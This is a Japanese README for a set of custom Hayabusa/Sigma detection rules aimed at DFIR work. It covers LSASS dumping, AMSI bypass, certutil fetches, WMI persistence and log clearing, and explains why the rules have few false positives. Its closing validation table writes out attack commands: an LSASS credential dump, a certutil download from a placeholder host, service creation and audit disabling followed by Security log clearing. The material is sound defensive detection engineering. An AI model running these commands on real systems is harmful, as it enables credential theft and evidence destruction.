# 高精度 / 低 FP カスタムルール

`bin/rules/` 同梱の Hayabusa 標準ルールセットを **置き換えずに** 上乗せする、
DFIR / 検知エンジニアリング向けの精選ルール集。すべて

- 攻撃者が機能を保ったまま回避しづらい特徴 (`Image + CommandLine + Path` の AND)
- ベンダー製品など正規利用が混入する箇所は明示的に除外
- スコア基準・回避コスト・既知バイパス手段をメタデータに記載
- ATT&CK タグ付き
- `falsepositives:` を必ず記述

を満たすよう設計してあります。

## ファイル一覧

| ファイル | 目的 | レベル | エンジン依存 |
|---|---|---|---|
| [hayfx_lsass_comsvcs_minidump.yml](hayfx_lsass_comsvcs_minidump.yml) | comsvcs.dll MiniDump による LSASS ダンプ | critical | 標準 Sigma |
| [hayfx_service_install_userwritable_path.yml](hayfx_service_install_userwritable_path.yml) | ユーザー書込可能パスへのサービス設置 | high | 標準 Sigma |
| [hayfx_amsi_patch_triad.yml](hayfx_amsi_patch_triad.yml) | PowerShell AMSI バイパス (3 トークン一致) | high | 標準 Sigma |
| [hayfx_certutil_remote_fetch.yml](hayfx_certutil_remote_fetch.yml) | certutil LOLBIN によるリモート取得 | critical | 標準 Sigma |
| [hayfx_wmi_persistence_filter_to_consumer.yml](hayfx_wmi_persistence_filter_to_consumer.yml) | WMI 永続化シーケンス | high | **hayfx `correlate:` 拡張が必要** |
| [hayfx_anti_forensics_clear_then_change.yml](hayfx_anti_forensics_clear_then_change.yml) | 監査ポリシ変更 → ログ消去シーケンス | critical | **hayfx `correlate:` 拡張が必要** |

「標準 Sigma」と書いたものは現状の `hayabusa.exe` でそのまま読み込めます。
`correlate:` を使うルール 2 本は、本プロジェクトの **ステップ 4** で実装
する独自エンジン拡張が必要です。今のうちに書いておくことで、エンジン
完成時に即時実戦投入できます。

## 設計指針 — なぜこれらが低 FP なのか

### 1. 「攻撃者が変えるとコストが発生する特徴」を選ぶ
- comsvcs.dll の `MiniDump` 関数名: 別の関数名にすると動かない
- AMSI バイパスの 3 トークン: どれを欠いても機能を失う
- 7045 + ユーザー書込パス: 攻撃に必要な「持続性」と背反する特徴

### 2. 単一イベントに頼らず順序 / 共起で精度を底上げ
- WMI 永続化: フィルタ作成だけでは検知過剰、`5860/5859 → 5861` の流れで初めて意図が見える
- アンチフォレンジック: 1102 単独はノイズ、`4719 → 1102` で初めて攻撃的意図
- これらは `correlate:` 拡張で本来の精度になる

### 3. 既知の「正規にぶつかる例外」を YAML 内で先回り除外
- comsvcs: System32 / SysWOW64 配下のみを対象に絞る
- certutil: Microsoft PKI ドメインを除外
- WMI binding: SCCM / CarbonBlack / CrowdStrike の文字列を除外
- 7045: MSIInstaller / SetupHost を除外

### 4. スコア値はメタ的シグナルで動的にブースト
- 親プロセスが `explorer.exe`（人手起動）→ +5
- 同窓に別の検知が並ぶ → corroborated_within() で +10〜+15
- これは ARCHITECTURE.md §12 のスコアエンジン (Rust 側、未実装) で評価予定

### 5. 必ず「攻撃者の回避コスト」を明記する
回避が容易なら confidence を下げる。回避が困難ならスコア高め。これにより
*手元のルールセットの強さ* が客観的に評価可能になる。

## 標準 Sigma ルールを今すぐ試す

```powershell
# 標準ルール (4 本) を Hayabusa にロード
& 'C:\COMSYS_hayabusa\bin\hayabusa-3.9.0-win-x64.exe' json-timeline `
    -f 'C:\COMSYS_hayabusa\workspace\uploads\some.evtx' `
    -r 'C:\COMSYS_hayabusa\rules-custom' `
    -c 'C:\COMSYS_hayabusa\bin\rules\config' `
    -L -o '.\custom-only.jsonl' `
    -s -b --no-wizard
```

GUI 側でこれらを読ませる場合は、`gui/server.py` の `build_hayabusa_argv()`
内 `-r` に `rules-custom` を追加してください。

## 拡張ルール (`correlate:`) を有効化するには

ARCHITECTURE.md §8.1 のとおり、本プロジェクトのフォーク版 Hayabusa エンジンに
`correlate:` パーサと 2-pass 評価器を実装する必要があります（ステップ 4）。
それまでこれらの YAML は YAML としてのリント / レビュー対象として保管します。

## 想定される赤チーム検証

各ルールについて、最小限テストすべき PoC は以下:

| ルール | PoC コマンド (検証環境のみで実行) |
|---|---|
| comsvcs MiniDump | `rundll32.exe comsvcs.dll, MiniDump <lsass_pid> C:\Windows\Temp\x.dmp full` |
| 7045 ユーザー書込パス | `sc.exe create svc1 binPath= "C:\Users\Public\bad.exe"` |
| AMSI 3 トークン | 公開リポジトリ `S3cur3Th1sSh1t/Amsi-Bypass-Powershell` の任意 PS スクリプト |
| certutil 取得 | `certutil.exe -urlcache -split -f https://example.invalid/x.bin x.bin` |
| WMI 永続化 | `wmic /namespace:\\root\subscription PATH __EventFilter CREATE ...`（CommandLineEventConsumer をペアで作成） |
| 4719 → 1102 | `auditpol /set /Category:* /success:disable` → `wevtutil cl Security` |

すべて **隔離環境で実行** し、Hayabusa にスキャンさせて該当ルールが発火するか
確認する想定です。
